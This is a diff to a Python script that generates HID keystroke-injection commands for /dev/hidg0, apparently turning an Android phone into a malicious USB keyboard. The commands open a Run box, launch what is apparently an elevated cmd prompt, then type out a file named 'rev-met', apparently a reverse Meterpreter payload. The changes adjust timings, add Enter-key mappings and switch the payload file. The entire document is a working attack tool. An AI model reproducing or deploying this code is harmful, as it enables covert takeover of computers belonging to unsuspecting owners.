@@ -73,6 +73,9 @@ def findinlist(byte):
 	elif byte=="9": print '''echo -ne "\\x00\\x00\\x00\\x26\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 	elif byte=="0": print '''echo -ne "\\x00\\x00\\x00\\x27\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 	#SDLK_RETURN,0x28
+	elif byte=="\x0a": print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
+	elif byte=="\x0d": print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
+
 	#SDLK_ESCAPE,0x29
 	#SDLK_BACKSPACE,0x2a
 	#SDLK_TAB,0x2b
@@ -112,24 +115,25 @@ def findinlist(byte):
 
 # pop up cmd
 
+print '''sleep 1'''
 print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
-print '''sleep 0.5'''
+print '''sleep 1'''
 print '''echo -ne "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
-print '''sleep 0.5'''
+print '''sleep 1'''
 print '''echo -ne "\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
-print '''sleep 0.5'''
+print '''sleep 1'''
 print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
-print '''sleep 0.5'''
+print '''sleep 3'''
 
-f = open("/sdcard/files/rev-met-https", "rb")
+f = open("/sdcard/files/rev-met", "rb")
 try:
     byte = f.read(1)
     while byte != "":
@@ -141,6 +145,7 @@ finally:
 
 
 #Hit enter
+print '''sleep 2'''
 
 print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
 print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
